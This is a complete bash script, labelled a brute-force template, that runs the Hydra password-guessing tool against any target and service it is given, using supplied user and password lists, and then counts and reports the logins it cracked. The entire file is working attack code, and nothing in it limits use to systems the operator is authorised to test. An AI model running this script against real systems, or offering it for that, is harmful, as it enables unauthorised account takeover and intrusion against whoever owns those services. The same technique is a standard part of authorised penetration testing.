#!/bin/bash
# Basic Brute-Force Script Template (Completed)

TARGET=$1
SERVICE=$2
USERLIST=$3
PASSLIST=$4
OUTPUT="bruteforce_$(date +%F_%T).log"

# Input validation
if [ $# -ne 4 ]; then
    echo "Usage: $0 <target> <service> <userlist> <passlist>"
    exit 1
fi

# File existence checks
if [ ! -f "$USERLIST" ]; then
    echo "Userlist file not found!"
    exit 1
fi

if [ ! -f "$PASSLIST" ]; then
    echo "Passlist file not found!"
    exit 1
fi

# Run Hydra attack
echo "[+] Starting Hydra attack..."
hydra -L "$USERLIST" -P "$PASSLIST" -v -f -o "$OUTPUT" "$TARGET" "$SERVICE"

if [ $? -ne 0 ]; then
    echo "Hydra execution failed."
    exit 1
fi

# Parse results
echo "[+] Attack Completed"
SUCCESS_COUNT=$(grep -c "login:" "$OUTPUT")

echo "============================="
echo "Brute-Force Summary Report"
echo "Target: $TARGET"
echo "Service: $SERVICE"
echo "Successful Logins: $SUCCESS_COUNT"
echo "Output File: $OUTPUT"
echo "============================="
